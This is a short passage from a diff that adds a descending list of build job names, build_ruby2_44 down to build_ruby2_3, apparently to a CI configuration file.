+      - build_ruby2_44
+      - build_ruby2_43
+      - build_ruby2_42
+      - build_ruby2_41
+      - build_ruby2_40
+      - build_ruby2_39
+      - build_ruby2_38
+      - build_ruby2_37
+      - build_ruby2_36
+      - build_ruby2_35
+      - build_ruby2_34
+      - build_ruby2_33
+      - build_ruby2_32
+      - build_ruby2_31
+      - build_ruby2_30
+      - build_ruby2_29
+      - build_ruby2_28
+      - build_ruby2_27
+      - build_ruby2_26
+      - build_ruby2_25
+      - build_ruby2_24
+      - build_ruby2_23
+      - build_ruby2_22
+      - build_ruby2_21
+      - build_ruby2_20
+      - build_ruby2_19
+      - build_ruby2_18
+      - build_ruby2_17
+      - build_ruby2_16
+      - build_ruby2_15
+      - build_ruby2_14
+      - build_ruby2_13
+      - build_ruby2_12
+      - build_ruby2_11
+      - build_ruby2_10
+      - build_ruby2_9
+      - build_ruby2_8
+      - build_ruby2_7
+      - build_ruby2_6
+      - build_ruby2_5
+      - build_ruby2_4
+      - build_ruby2_3
